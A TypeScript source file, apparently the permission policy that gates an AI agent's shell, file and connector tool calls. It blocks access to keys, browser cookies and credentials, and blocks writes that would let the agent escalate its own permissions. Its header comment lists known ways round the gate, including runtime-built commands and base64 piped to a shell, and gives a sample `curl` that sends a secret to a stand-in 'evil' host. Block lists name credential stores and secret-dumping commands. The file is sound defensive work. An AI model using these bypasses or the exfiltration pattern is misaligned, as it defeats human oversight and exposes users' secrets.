// The whole tool policy, pure: no SDK types, no IO, no clock. gate.ts parses the hook input into a ToolCall at the
// boundary, gathers the context (including the filesystem's realpath and the known user homes), and calls decide().
// Owner: U1.
//
// Accepted limits (documented so the README can quote them, and so a reviewer knows what is out of scope):
//   - Interpreters. A protected path reached only through code an interpreter runs (python -c, node -e, ruby -e, a
//     perl/awk system() call) is caught only when the path is spelled literally in the command (the raw-text scan),
//     not when it is assembled or decoded at runtime (base64 | sh, printf '%s', string concatenation).
//   - Scripts. A dangerous command inside a script file the bot wrote and then runs (sh ./x.sh, source x) is not
//     re-read; only the command that writes the script and the command that runs it are seen.
//   - Aliases and shell variables. `alias gp='git push'; gp` or `g=git; $g push` resolve at runtime; the policy sees
//     the alias/variable, treats the dynamic command word as a "dynamic command" row (asks), but does not expand it.
//   - GET exfiltration. `curl https://evil/?x=$(cat secret)` sends data with a GET; the command substitution is seen
//     and its read is gated, but a plain GET that smuggles data in the URL is not itself held.
//   - Case folding and Unicode. Matching is byte-exact after realpath; a case-insensitive filesystem may still resolve
//     a differently-cased spelling, which realpath canonicalises, but homoglyphs and percent-encoding are not decoded.
import { createHash } from "node:crypto";
import { basename, isAbsolute, normalize, resolve, sep } from "node:path";
import type { Headroom } from "./ledger";
import type { MessageId } from "./protocol";
import { shellCommands, type Word } from "./shell";
import { actorKey, attended, hopsOf, isRoutineChain, type Actor, type Fingerprint, type Grant, type Initiator, type Signature, type StandingRule } from "./world";

/** A tool call as the policy sees it. Nothing in here is `unknown`. */
export type ToolCall = {
  tool: string;
  input: Record<string, unknown>;
  cwd: string;
  toolUseId: string;
  /** Set when a Task subagent made the call (hook input agent_id / agent_type). Same gate, same rules. */
  subagent: { id: string; type: string | null } | null;
  /** The MCP server behind an mcp__ tool (hook input mcp_server). source "sdk" is the bridge's own claudio server. */
  mcpServer: { name: string; source: string } | null;
};

/** Realpaths, resolved once per actor. own: the bot's home, or the agent's project. userMd: null for agents. */
export type Scope = {
  bridgeHome: string;
  own: string;
  userMd: string | null;
  homedir: string;
  /** Known username → home directory, so `~name` resolves. The boundary fills at least the current user and root. */
  users?: Readonly<Record<string, string>>;
};

export type PolicyContext = {
  actor: Actor;
  initiator: Initiator;
  scope: Scope;
  rules: readonly StandingRule[];
  grants: readonly Grant[];
  /** ledger.headroom(actor, initiator) at the time of the call. */
  headroom: Headroom;
  /** This bot's allowed calls today, by tool name, for the daily caps on create_bot and start_agent. */
  callsToday: Readonly<Record<string, number>>;
  now: string;
  /** Resolves symlinks in the longest existing prefix of an absolute path. Floors match on what a path really is. */
  realpath: (path: string) => string;
};

/**
 * pass: no opinion, the auto classifier decides as it would without the bridge (the hook returns {}).
 * allow: only a user's grant or Always does this; it skips the classifier. rule: the grant's fingerprint or the
 *   Always rule's signature.
 * ask: the call is denied with a "held for approval" reason and a permission card opens. Never SDK "ask" or "defer".
 *   offerAlways is false for rows too broad or too risky to carry an Always button (the card shows Once/Deny/Never).
 * deny: blocked. handOff asks the bot to hand the step back to the user (passwords, payments, 2FA).
 */
export type Decision =
  | { kind: "pass" }
  | { kind: "allow"; via: "grant" | "always"; rule: string; cardId: MessageId }
  | { kind: "deny"; via: DenyVia; rule: string; reason: string; handOff: boolean }
  | { kind: "ask"; rule: string; label: string; signature: Signature; always: string; offerAlways: boolean };

export type DenyVia = "floor" | "initiator" | "limit" | "never" | "rule" | "malformed";

/** Allowed calls per bot per local day. Past these, a runaway chain stops making bots and agents. */
export const DAILY_CAPS: Readonly<Record<string, number>> = { mcp__claudio__create_bot: 5, mcp__claudio__start_agent: 20 };

/** The SDK's own plumbing. A subagent's tool calls are gated one by one; the spawn and the hand-back are not effects. */
const SDK_INTERNAL = new Set(["Agent", "SubagentHandback"]);

const PASS: Decision = { kind: "pass" };

/** One simple command of a Bash line, wrappers stripped, with the directory it runs in and the paths it touches. */
type Part =
  | { kind: "bash"; words: string[]; verb: string; text: string; cwd: string; dynamicCmd: boolean; touches: Touch[] }
  | { kind: "call"; call: ToolCall; touches: Touch[] };

/** A path a call touches, as written (resolved against cwd and ~) and as it really is (symlinks resolved). */
type Touch = {
  lexical: string;
  real: string;
  /** Also a hit when it is an ancestor of a protected root (a recursive/reading verb, Grep/Glob, or a glob/$ word). */
  ancestorToo: boolean;
  /** The call writes this path (an output redirect, a writing verb, or a file-writing tool), for self-escalation. */
  write: boolean;
};

type View = { parts: Part[]; raw: string };

const isRecord = (v: unknown): v is Record<string, unknown> => typeof v === "object" && v !== null && !Array.isArray(v);

const claudio = (name: string) => `mcp__claudio__${name}`;
const isClaudio = (call: ToolCall) => call.tool.startsWith("mcp__claudio__") && (call.mcpServer?.source ?? "sdk") === "sdk";
const isConnector = (call: ToolCall) => call.tool.startsWith("mcp__") && !isClaudio(call);

/** snake_case, kebab-case and camelCase split into lowercase words. */
const wordsOf = (name: string) =>
  name
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toLowerCase()
    .split(/[^a-z0-9]+/)
    .filter(Boolean);

const mcpName = (tool: string) => tool.split("__").slice(1).join(" ");

const isDigits = (s: string) => /^\d+$/.test(s);
const stripScheme = (w: string) => w.replace(/^file:\/\/(localhost)?/, "");

/** Resolve ~, ~name, ~+, ~-, $HOME against the scope and the current directory. Unknown ~name is left unresolved. */
function expandHome(word: string, ctx: PolicyContext, dir: string): string {
  const home = ctx.scope.homedir;
  const w = word.replace(/\$\{HOME\}|\$HOME(?![A-Za-z0-9_])/g, home);
  if (w === "~" || w.startsWith("~/")) return home + w.slice(1);
  if (w === "~+" || w.startsWith("~+/")) return dir + w.slice(2);
  if (w === "~-" || w.startsWith("~-/")) return dir + w.slice(2);
  const m = w.match(/^~([A-Za-z0-9._-]+)(\/.*)?$/);
  if (m) {
    const h = userHome(m[1]!, ctx);
    if (h !== null) return h + (m[2] ?? "");
  }
  return w;
}

/** The home of a named user: the scope's table first, then the current user when the name matches the home's basename. */
function userHome(name: string, ctx: PolicyContext): string | null {
  const known = ctx.scope.users?.[name];
  if (known !== undefined) return known;
  if (name === basename(ctx.scope.homedir)) return ctx.scope.homedir;
  return null;
}

/** An absolute path with `..` left in place, so realpath resolves symlinks before `..` instead of after. */
const absRaw = (p: string, dir: string) => (isAbsolute(p) ? p : `${dir}${sep}${p}`);

/** Keys whose string values are paths, in any tool's input (built-in file tools and MCP filesystem servers alike). */
const PATH_KEY = /path|file|dir|folder|uri|url|location|^(cwd|src|source|dest|destination|target)$/i;
const looksPath = (v: string) => /^[~/]/.test(v) || v.startsWith("file://") || /\$\{?HOME\b/.test(v) || v.includes("/");

/** Every string in a tool's input that could name a path: keyed as a path, or shaped like one anywhere it appears. */
function inputPaths(value: unknown, key: string | null, out: string[]) {
  if (typeof value === "string") {
    if (value !== "" && ((key !== null && PATH_KEY.test(key)) || looksPath(value))) out.push(value);
  } else if (Array.isArray(value)) {
    for (const v of value) inputPaths(v, key, out);
  } else if (isRecord(value)) {
    for (const [k, v] of Object.entries(value)) inputPaths(v, k, out);
  }
}

/** Prefix words that run the command after them. Each lists its options that take a value. */
const WRAPPERS: Record<string, readonly string[]> = {
  env: ["-u", "-C", "-S"],
  command: [],
  builtin: [],
  exec: ["-a"],
  nohup: [],
  time: [],
  nice: ["-n"],
  arch: [],
  stdbuf: [],
  setsid: [],
  npx: ["-p", "--package", "-c"],
  bunx: [],
  watch: ["-n", "--interval"],
  sudo: ["-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T"],
  doas: ["-u", "-C"],
  xargs: ["-I", "-n", "-P", "-L", "-d", "-E", "-s", "-a"],
  timeout: ["-s", "-k"],
  caffeinate: ["-t", "-w"],
  if: [],
  then: [],
  else: [],
  elif: [],
  do: [],
  while: [],
  until: [],
  "!": [],
  "{": [],
};
const SHELLS = new Set(["bash", "sh", "zsh", "dash", "ksh", "fish"]);
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** The command a segment really runs, or a script it hands to a shell (bash -c, eval). Operates on de-quoted words. */
function unwrap(raw: string[]): { words: string[] } | { script: string } {
  let words = raw;
  for (;;) {
    while (words.length > 0 && ASSIGNMENT.test(words[0]!)) words = words.slice(1);
    const head = words[0] === undefined ? "" : basename(words[0]);
    const valued = WRAPPERS[head];
    if (valued !== undefined) {
      let i = 1;
      while (i < words.length && (words[i]!.startsWith("-") || ASSIGNMENT.test(words[i]!))) i += valued.includes(words[i]!) ? 2 : 1;
      if (head === "timeout" && i < words.length) i++;
      words = words.slice(i);
      continue;
    }
    if (head === "script") {
      // script [flags] <file> <command…>: skip flags, then the typescript file, then run the rest.
      let i = 1;
      while (i < words.length && words[i]!.startsWith("-")) i++;
      if (i < words.length) i++;
      words = words.slice(i);
      continue;
    }
    if (SHELLS.has(head)) {
      const flag = words.findIndex((w, i) => i > 0 && /^-[a-z]*c[a-z]*$/.test(w));
      if (flag !== -1) {
        let j = flag + 1;
        while (words[j] === "--") j++;
        if (words[j] !== undefined) return { script: words[j]! };
      }
    }
    if (head === "eval") return { script: words.slice(1).join(" ") };
    return { words: head === "" ? [] : [head, ...words.slice(1)] };
  }
}

const hasFlag = (words: string[], re: RegExp) => words.some((w) => w.startsWith("-") && re.test(w));
const RECURSIVE = (verb: string, words: string[]) =>
  verb === "find" || verb === "rg" || verb === "ln" || verb === "ditto" || verb === "tar" ||
  (verb === "grep" && (hasFlag(words, /^-[A-Za-z]*[rR]/) || words.includes("--recursive"))) ||
  (verb === "cp" && (hasFlag(words, /^-[A-Za-z]*[aRr]/) || words.some((w) => w === "--recursive" || w === "--archive"))) ||
  (verb === "zip" && hasFlag(words, /^-[A-Za-z]*r/)) ||
  (verb === "rsync" && hasFlag(words, /^-[A-Za-z]*[ar]/)) ||
  (verb === "du" && false);
const WRITING = (verb: string, words: string[]) =>
  verb === "tee" || verb === "cp" || verb === "mv" || verb === "ln" || verb === "install" || verb === "ditto" || verb === "rsync" || verb === "dd" ||
  (verb === "sed" && hasFlag(words, /^-[A-Za-z]*i/)) || (verb === "perl" && hasFlag(words, /^-[A-Za-z]*i/));

/** A command word is a $PATH lookup, not a cwd-relative file, unless it is spelled as a path. */
const commandIsPath = (text: string) => text.startsWith("/") || text.startsWith("~") || text.startsWith("./") || text.startsWith("../");
const META = /[$`*?[{]/;

/**
 * One path a word names: `~`, `~name`, `~+` and `$HOME` are expanded first, then the path is cut at the first metachar
 * that is still unresolved ($VAR, a backtick, a glob). A word with a leftover metachar only knows its literal prefix,
 * so it matches a root as an ancestor (its glob could expand into the root). Empty prefixes resolve to nothing.
 */
function candidateTouch(raw: string, dir: string, ctx: PolicyContext, ancestorAnyway: boolean, write: boolean): Touch | null {
  const expanded = expandHome(stripScheme(raw), ctx, dir);
  const m = expanded.search(META);
  const cut = m === -1 ? expanded : expanded.slice(0, m);
  if (cut === "" || isDigits(cut)) return null;
  const lexical = normalize(resolve(dir, cut));
  const real = normalize(ctx.realpath(absRaw(cut, dir)));
  return { lexical, real, ancestorToo: ancestorAnyway || m !== -1, write };
}

/** The path touches of one simple command's words, resolved against its working dir. */
function touchesOf(words: Word[], verb: string, dir: string, ctx: PolicyContext): Touch[] {
  const texts = words.map((w) => w.text);
  const recursive = RECURSIVE(verb, texts);
  const writing = WRITING(verb, texts);
  const touches: Touch[] = [];
  const seen = new Set<string>();
  for (let n = 0; n < words.length; n++) {
    const w = words[n]!;
    if (n === 0 && !w.redirect && !commandIsPath(w.text)) continue;
    const option = w.text.startsWith("-") && !w.redirect;
    const eq = w.text.indexOf("=");
    const candidates = option ? [] : [w.text];
    if (eq > 0) candidates.push(w.text.slice(eq + 1));
    for (const raw of candidates) {
      // A repeated argument (a huge `curl a a a …`) resolves to the same touch, so collapse it before realpath.
      const key = `${w.redirectOut ? 1 : 0}${raw}`;
      if (seen.has(key)) continue;
      seen.add(key);
      const t = candidateTouch(raw, dir, ctx, recursive, w.redirectOut || writing);
      if (t) touches.push(t);
    }
  }
  return touches;
}

/** The simple commands of a Bash line in order, each with its working directory as `cd` leaves it, and its touches. */
function bashParts(command: string, cwd: string, ctx: PolicyContext): Part[] {
  const parts: Part[] = [];
  let dir = ctx.realpath(cwd);
  const home = ctx.scope.homedir;
  const emit = (words: Word[], depth: number): void => {
    const u = unwrap(words.map((w) => w.text));
    if ("script" in u) {
      if (depth >= 4) throw new Error("shell scripts nested too deep to read");
      for (const c of shellCommands(u.script)) emit(c.words, depth + 1);
      return;
    }
    if (u.words.length === 0) return;
    const at = dir;
    // Keep the Word objects for the unwrapped command (drop the stripped wrapper/assignment prefix).
    const effective = words.slice(words.length - u.words.length);
    const verb = basename(u.words[0]!);
    parts.push({ kind: "bash", words: u.words, verb, text: u.words.join(" "), cwd: at, dynamicCmd: effective[0]?.dynamic ?? false, touches: touchesOf(effective, verb, at, ctx) });
    if (verb === "find") {
      const i = effective.findIndex((w) => w.text === "-exec" || w.text === "-execdir");
      if (i !== -1) {
        const end = effective.findIndex((w, j) => j > i && (w.text === ";" || w.text === "+"));
        const sub = effective.slice(i + 1, end === -1 ? undefined : end).filter((w) => w.text !== "{}");
        if (sub.length > 0) emit(sub, depth + 1);
      }
    }
    if (verb === "osascript" && depth < 4) {
      // `osascript -e 'do shell script "…"'` runs a shell command; read it too.
      const m = effective.map((w) => w.text).join(" ").match(/do shell script\s+["']([^"']*)["']/i);
      if (m) for (const c of shellCommands(m[1]!)) emit(c.words, depth + 1);
    }
    if (u.words[0] === "cd" || u.words[0] === "pushd") {
      const target = u.words[1];
      if (target === undefined) dir = home;
      else if (target !== "-") dir = ctx.realpath(absRaw(expandHome(target, ctx, dir), dir));
    }
  };
  for (const c of shellCommands(command)) emit(c.words, 0);
  return parts;
}

function viewOf(call: ToolCall, ctx: PolicyContext): View {
  if (call.tool === "Bash") {
    const raw = String(call.input.command);
    return { parts: bashParts(raw, call.cwd, ctx), raw };
  }
  const found: string[] = [];
  inputPaths(call.input, null, found);
  if (call.tool === "Glob" && typeof call.input.pattern === "string") found.push(call.input.pattern);
  const recursive = call.tool === "Grep" || call.tool === "Glob";
  if (found.length === 0 && !recursive) return { parts: [{ kind: "call", call, touches: [] }], raw: "" };
  const write = FILE_WRITES.has(call.tool);
  const dir = normalize(ctx.realpath(call.cwd));
  const touches = found.flatMap((raw) => candidateTouch(raw, dir, ctx, recursive, write) ?? []);
  // Grep and Glob recurse from the working directory, so the directory itself is an ancestor touch they reach into.
  if (recursive) touches.push({ lexical: dir, real: dir, ancestorToo: true, write: false });
  return { parts: [{ kind: "call", call, touches }], raw: "" };
}

const under = (path: string, root: string) => path === root || path.startsWith(root.endsWith(sep) ? root : root + sep);
/** The touch hits the root: inside it, or (when the touch may span it) an ancestor of it, by lexical and real path. */
const hits = (t: Touch, rootLex: string, rootReal: string) =>
  under(t.lexical, rootLex) || under(t.real, rootReal) || (t.ancestorToo && (under(rootLex, t.lexical) || under(rootReal, t.real)));

type Floor = {
  id: string;
  label: string;
  /** Protected roots, as written; their realpaths are protected too. */
  roots: (ctx: PolicyContext) => string[];
  /** Realpaths inside the roots that stay allowed. */
  except?: (ctx: PolicyContext) => string[];
  /** A command that is itself forbidden, regardless of the paths it names (the `security` CLI, `ssh-add -L`). */
  bash?: (part: Extract<Part, { kind: "bash" }>) => boolean;
  connector?: (call: ToolCall) => boolean;
  /** A write to a config file the bridge itself loads (self-escalation), by its target path. */
  write?: (path: string, ctx: PolicyContext) => boolean;
  /** Scan the raw command text for the root spelled literally, to catch it inside an interpreter or a heredoc. */
  rawScan?: boolean;
  handOff?: boolean;
};

const inHome = (...rels: string[]) => (ctx: PolicyContext) => rels.map((r) => resolve(ctx.scope.homedir, r));

const HANDOFF_WORDS = new Set(["pay", "payment", "payments", "purchase", "checkout", "password", "passwords", "passcode", "otp", "totp", "2fa", "mfa", "cvv", "cvc"]);

function keyWords(value: unknown, out: Set<string>) {
  if (Array.isArray(value)) for (const v of value) keyWords(v, out);
  else if (isRecord(value))
    for (const [k, v] of Object.entries(value)) {
      for (const w of wordsOf(k)) out.add(w);
      if (/card_?number|credit_?card/i.test(k)) out.add("payment");
      keyWords(v, out);
    }
}

/** A connector tool that pays, buys, or takes a password or a one-time code, by its name or its input's field names. */
function handsOff(call: ToolCall): boolean {
  const words = new Set(wordsOf(call.tool.split("__").slice(2).join("_")));
  keyWords(call.input, words);
  return [...words].some((w) => HANDOFF_WORDS.has(w));
}

/** The names browsers and apps give cookie, login and key stores, matched by basename anywhere they are found. */
const SECRET_FILES = /^(Cookies|Login Data|Web Data|cookies\.sqlite|key4\.db|key3\.db|logins\.json|\.git-credentials|\.netrc)$|\.keychain-db$/;

/** The config files whose write would change how the bridge or git runs this bot (self-escalation). */
const ESCALATE = {
  bridgeLoaded(path: string, ctx: PolicyContext): boolean {
    const settings = /(^|\/)\.claude\/settings[^/]*$/.test(path);
    const mcp = /(^|\/)\.mcp\.json$/.test(path);
    const claudeHome = resolve(ctx.scope.homedir, ".claude");
    return (settings && (under(path, ctx.scope.own) || under(path, claudeHome))) || (mcp && under(path, ctx.scope.own));
  },
  config(path: string, ctx: PolicyContext): boolean {
    if (/(^|\/)\.claude\/settings[^/]*$/.test(path) || /(^|\/)\.mcp\.json$/.test(path)) return true;
    if (/(^|\/)\.git\/hooks\//.test(path) || /(^|\/)\.git\/config$/.test(path)) return true;
    if (/(^|\/)\.(zshrc|zprofile|bashrc|bash_profile|profile)$/.test(path)) return true;
    if (under(path, resolve(ctx.scope.homedir, "Library/LaunchAgents"))) return true;
    for (const d of ["hooks", "commands", "agents", "skills", "plugins"]) if (under(path, resolve(ctx.scope.homedir, ".claude", d))) return true;
    return false;
  },
};

/** Always denied, checked first, never liftable: no card is ever posted for these, so no rule or grant can name them. */
const FLOORS: readonly Floor[] = [
  {
    id: "floor.bridge",
    label: "ClaudioBot's own state, tokens and other bots' homes",
    roots: (ctx) => [ctx.scope.bridgeHome, ...inHome(".claudiobot", ".claudebot")(ctx)],
    except: (ctx) => (ctx.actor.kind === "bot" ? [ctx.scope.own, ...(ctx.scope.userMd === null ? [] : [ctx.scope.userMd])] : []),
  },
  {
    id: "floor.selfescalate",
    label: "a config file the bridge itself loads",
    roots: () => [],
    write: (path, ctx) => ESCALATE.bridgeLoaded(path, ctx),
  },
  {
    id: "floor.keys",
    label: "SSH, GPG and cloud keys or the Keychain",
    roots: inHome(".ssh", ".gnupg", ".aws", ".config/gcloud", ".azure", "Library/Keychains"),
    bash: (p) => p.verb === "security" || (p.verb === "ssh-add" && p.words.includes("-L")) || (p.verb === "gpg" && p.words.some((w) => w.includes("export-secret"))),
    rawScan: true,
  },
  {
    id: "floor.browser",
    label: "browser profiles and cookies",
    roots: inHome(
      "Library/Application Support/Google/Chrome",
      "Library/Application Support/Google/Chrome Beta",
      "Library/Application Support/Chromium",
      "Library/Application Support/BraveSoftware",
      "Library/Application Support/Firefox",
      "Library/Application Support/Mozilla",
      "Library/Application Support/Arc",
      "Library/Application Support/Microsoft Edge",
      "Library/Application Support/com.operasoftware.Opera",
      "Library/Application Support/Vivaldi",
      "Library/Application Support/Orion",
      "Library/Application Support/Zen",
      "Library/Application Support/Slack",
      "Library/Application Support/discord",
      "Library/Safari",
      "Library/Containers/com.apple.Safari",
      "Library/Cookies",
    ),
    rawScan: true,
  },
  {
    id: "floor.secretfile",
    label: "a cookie, login or key store",
    roots: () => [],
    write: () => false,
  },
  {
    id: "floor.creds",
    label: "a stored credential or token",
    roots: inHome(".netrc", ".config/gh/hosts.yml", ".npmrc", ".docker/config.json", ".kube/config", ".git-credentials", ".pypirc", ".claude/.credentials.json", ".claude.json", ".claude/history.jsonl", ".claude/projects", "Library/Application Support/1Password"),
    bash: (p) =>
      (p.verb === "gh" && p.words[1] === "auth" && (["token", "refresh"].includes(p.words[2] ?? "") || (p.words[2] === "status" && p.words.includes("-t")))) ||
      (p.verb === "git" && (p.words[1] ?? "").startsWith("credential")),
  },
  { id: "floor.payment", label: "a password, a payment or a 2FA code", roots: () => [], connector: handsOff, handOff: true },
];

function floorHit(floor: Floor, call: ToolCall, view: View, ctx: PolicyContext): boolean {
  if (floor.connector && isConnector(call) && floor.connector(call)) return true;
  if (floor.bash && view.parts.some((p) => p.kind === "bash" && floor.bash!(p))) return true;
  if (floor.write) {
    for (const p of view.parts) for (const t of p.touches) if (t.write && (floor.write(t.real, ctx) || floor.write(t.lexical, ctx))) return true;
  }
  if (floor.id === "floor.secretfile") {
    for (const p of view.parts) for (const t of p.touches) if (SECRET_FILES.test(basename(t.real)) || SECRET_FILES.test(basename(t.lexical))) return true;
  }
  const roots = floor.roots(ctx);
  if (roots.length > 0) {
    const realRoots = roots.map(ctx.realpath);
    const except = floor.except?.(ctx) ?? [];
    for (const p of view.parts)
      for (const t of p.touches)
        if (roots.some((r, i) => hits(t, r, realRoots[i]!)) && !except.some((e) => under(t.real, e))) return true;
    if (floor.rawScan && view.raw !== "" && rawScanHit(view.raw, roots, realRoots, ctx)) return true;
  }
  return false;
}

/** The raw command spelled a protected root literally (inside python -c, node -e, a heredoc): deny it anyway. */
function rawScanHit(raw: string, rootsLex: string[], rootsReal: string[], ctx: PolicyContext): boolean {
  const home = ctx.scope.homedir;
  const needles = new Set<string>();
  for (const r of [...rootsLex, ...rootsReal]) {
    needles.add(r);
    if (r.startsWith(home)) for (const h of ["~", "$HOME", "${HOME}"]) needles.add(h + r.slice(home.length));
  }
  return [...needles].some((n) => raw.includes(n));
}

const floorReason = (f: Floor) =>
  f.handOff
    ? `This step needs ${f.label}, which only the user may enter. It did not run. Ask the user to do this step themselves, then carry on.`
    : `This touches ${f.label}, which the bridge never allows. It did not run. Do not retry it or reach it another way.`;

const BANS: readonly { id: string; tools: readonly string[]; applies: (i: Initiator) => boolean; reason: string }[] = [
  {
    id: "ban.routine_admin",
    tools: [claudio("set_routine"), claudio("delete_routine")],
    applies: isRoutineChain,
    reason: "Routines cannot create, change or delete routines, even when run by hand. It did not run. Tell the user what you wanted to change.",
  },
  {
    id: "ban.hops",
    tools: [claudio("message_bot"), claudio("create_bot")],
    applies: (i) => hopsOf(i) >= 2,
    reason: "This work came through 2 or more bot-to-bot messages, so it cannot message or create bots. It did not run. Finish with what you have.",
  },
  {
    id: "ban.no_turn",
    tools: [claudio("message_bot")],
    applies: (i) => i.kind === "system",
    reason: "No turn is in flight, so there is nothing to message another bot about. It did not run.",
  },
];

function limitOf(call: ToolCall, ctx: PolicyContext): Decision | null {
  const h = ctx.headroom;
  if (!h.ok)
    return h.reason === "daily_cap"
      ? deny("limit", "limit.daily_cap", `This bot's daily spending cap is reached, so nothing more runs until ${h.until}. It did not run. End your turn.`)
      : deny("limit", "limit.agent_budget", "This agent's budget is used up. It did not run. End your turn and report what you have.");
  const cap = DAILY_CAPS[call.tool];
  if (cap !== undefined && (ctx.callsToday[call.tool] ?? 0) >= cap) {
    const name = call.tool.replace("mcp__claudio__", "");
    return deny("limit", `limit.${name}`, `This bot already used ${name} ${cap} times today, the daily limit. It did not run. Tell the user instead.`);
  }
  return null;
}

type Cell = "pass" | "ask";
type CellOf = Cell | ((part: Part, ctx: PolicyContext) => Cell);
type Row = { id: string; label: string; match: (part: Part, ctx: PolicyContext) => boolean; attended: CellOf; unattended: CellOf; offerAlways?: boolean };

const bash = (test: (words: string[], text: string, part: Extract<Part, { kind: "bash" }>, ctx: PolicyContext) => boolean) => (p: Part, ctx: PolicyContext) =>
  p.kind === "bash" && test(p.words, p.text, p, ctx);
const re = (pattern: RegExp) => bash((_, text) => pattern.test(text));
const tool = (test: (call: ToolCall, ctx: PolicyContext) => boolean) => (p: Part, ctx: PolicyContext) => p.kind === "call" && test(p.call, ctx);

/** The first non-option word after a command, past the options that take a value. */
function subcommand(words: string[], from: number, valued: readonly string[]): { sub: string; args: string[] } | null {
  let i = from;
  while (i < words.length && words[i]!.startsWith("-")) i += valued.includes(words[i]!) ? 2 : 1;
  return i < words.length ? { sub: words[i]!, args: words.slice(i + 1) } : null;
}

/** git's subcommand and the words after it, past global options such as -C <dir>. */
function gitArgs(words: string[]): { sub: string; args: string[] } | null {
  if (basename(words[0] ?? "") !== "git") return null;
  return subcommand(words, 1, ["-C", "-c", "--git-dir", "--work-tree", "--namespace"]);
}
const git = (sub: string, test: (args: string[]) => boolean = () => true) =>
  bash((words) => {
    const g = gitArgs(words);
    return g !== null && g.sub === sub && test(g.args);
  });

/** gh's subcommand and its args, past the global flags that come before it. */
function ghArgs(words: string[]): { sub: string; args: string[] } | null {
  if (basename(words[0] ?? "") !== "gh") return null;
  return subcommand(words, 1, ["-R", "--repo", "--hostname"]);
}

/** The HTTP method a curl/gh request sets, from -X/--method/--request in any spelling, or null. */
function httpMethod(args: string[]): string | null {
  for (let k = 0; k < args.length; k++) {
    const a = args[k]!;
    if (a.startsWith("--")) {
      const [name, inline] = a.slice(2).split("=") as [string, string | undefined];
      if (name === "method" || name === "request") return (inline ?? args[k + 1] ?? "").toUpperCase();
    } else if (/^-[A-Za-z]*X/.test(a)) {
      const after = a.slice(a.indexOf("X") + 1);
      return (after || args[k + 1] || "").toUpperCase();
    }
  }
  return null;
}
const WRITE_METHOD = (m: string | null) => m === "POST" || m === "PUT" || m === "PATCH" || m === "DELETE";

/** curl sends a body or follows a config file (-d/-F/-T/-K, --data*, --form, --upload-file, a write method). */
function curlSends(args: string[]): boolean {
  for (let k = 0; k < args.length; k++) {
    const a = args[k]!;
    if (a.startsWith("--")) {
      const name = a.slice(2).split("=")[0]!;
      if (/^data/.test(name) || name === "form" || name === "form-string" || name === "upload-file" || name === "config" || name === "json") return true;
    } else if (a.startsWith("-") && a.length > 1) {
      const cluster = a.slice(1);
      if (/[dFTK]/.test(cluster)) return true;
    }
  }
  return WRITE_METHOD(httpMethod(args));
}

/** wget writes a request body or sets a non-GET method. */
function wgetSends(args: string[]): boolean {
  return args.some((a) => /^--(post-data|post-file|body-data|body-file)\b/.test(a)) || WRITE_METHOD((args.find((a) => a.startsWith("--method")) ?? "").split("=")[1]?.toUpperCase() ?? httpMethod(args));
}

const inScope = (real: string, ctx: PolicyContext) => under(real, ctx.scope.own) || (ctx.scope.userMd !== null && real === ctx.scope.userMd);
const outside = (path: string, cwd: string, ctx: PolicyContext) => !inScope(ctx.realpath(absRaw(expandHome(path, ctx, cwd), cwd)), ctx);

const FILE_WRITES = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const WRITE_VERBS = new Set([
  "send", "post", "create", "update", "delete", "remove", "merge", "publish", "comment", "reply", "invite", "transfer",
  "push", "upload", "share", "archive", "close", "approve", "submit", "cancel", "write", "edit", "move", "set", "put",
  "patch", "run", "exec", "execute", "trigger", "deploy", "enable", "disable", "revoke", "buy", "order", "charge", "pay",
  "tweet", "drop", "rm", "provision", "destroy", "scale", "rollout", "restart", "dispatch", "star", "insert", "add", "draft",
]);
const READ_VERBS = new Set(["get", "list", "read", "search", "find", "fetch", "describe", "view", "query", "count"]);
const verbsOf = (call: ToolCall) => wordsOf(call.tool.split("__").slice(2).join("_"));
const SHELL_DEPLOY = { npm: ["-w", "--workspace", "--otp", "--prefix", "--registry"], pnpm: ["--filter", "-C", "--dir"], yarn: [], bun: [], kubectl: ["--context", "-n", "--namespace"], terraform: [], aws: [], gcloud: [], az: [], wrangler: [], docker: [], helm: [], sam: [], cdk: [], eas: [] } as const;
const DEPLOY_VERBS = new Set(["deploy", "publish", "push", "apply", "destroy", "delete", "create", "update", "sync", "promote", "rollback", "install", "upgrade", "uninstall", "submit", "up", "scale", "rollout", "unpublish"]);

/** The meaningful subcommand of a per-tool CLI, past that tool's global value-flags. */
function deploySub(words: string[]): { tool: string; sub: string; args: string[] } | null {
  const t = basename(words[0] ?? "");
  const valued = (SHELL_DEPLOY as Record<string, readonly string[]>)[t];
  if (valued === undefined) return null;
  let s = subcommand(words, 1, valued);
  if (t === "yarn" && s?.sub === "npm") s = subcommand(s.args, 0, []);
  return s === null ? null : { tool: t, sub: s.sub, args: s.args };
}

/** First matching row wins per part; the strictest part wins per call. The only list of risky commands in the bridge. */
const TABLE: readonly Row[] = [
  {
    id: "self.escalate",
    label: "Change a config file that controls how it runs",
    match: (p, ctx) => p.touches.some((t) => t.write && (ESCALATE.config(t.real, ctx) || ESCALATE.config(t.lexical, ctx))),
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "dynamic.command",
    label: "Run a command it builds at runtime",
    match: (p) => p.kind === "bash" && p.dynamicCmd,
    attended: "ask",
    unattended: "ask",
    offerAlways: false,
  },
  {
    id: "git.rewrite",
    label: "Force-push or rewrite history",
    match: bash((words) => {
      const g = gitArgs(words);
      if (g === null) return false;
      if (g.sub === "push") return g.args.some((a) => a === "-f" || a.startsWith("--force") || (a.startsWith("+") && a.length > 1));
      if (g.sub === "reset") return g.args.includes("--hard") && g.args.some((a) => a.includes("/"));
      return g.sub === "branch" && g.args.includes("-D");
    }),
    attended: "ask",
    unattended: "ask",
  },
  {
    id: "git.push.default",
    label: "Push to the default branch",
    match: git("push", (args) => {
      const refs = args.filter((a) => !a.startsWith("-"));
      const flags = args.filter((a) => a.startsWith("-"));
      if (flags.some((f) => f === "--all" || f === "--mirror" || f === "--tags")) return true;
      if (refs.length <= 1) return true; // bare `git push` (only a remote, or nothing) targets the current branch
      return refs.some((a) => /^(?:[^:]*:)?(?:refs\/heads\/)?(?:main|master)$/.test(a) || a === "HEAD" || a.includes("$"));
    }),
    attended: "ask",
    unattended: "ask",
  },
  { id: "git.push", label: "Push a branch", match: git("push"), attended: "pass", unattended: "ask" },
  { id: "gh.merge", label: "Merge a pull request", match: bash((w) => { const g = ghArgs(w); return g?.sub === "pr" && g.args[0] === "merge"; }), attended: "ask", unattended: "ask" },
  {
    id: "gh.admin",
    label: "Delete, archive or rename a GitHub repo",
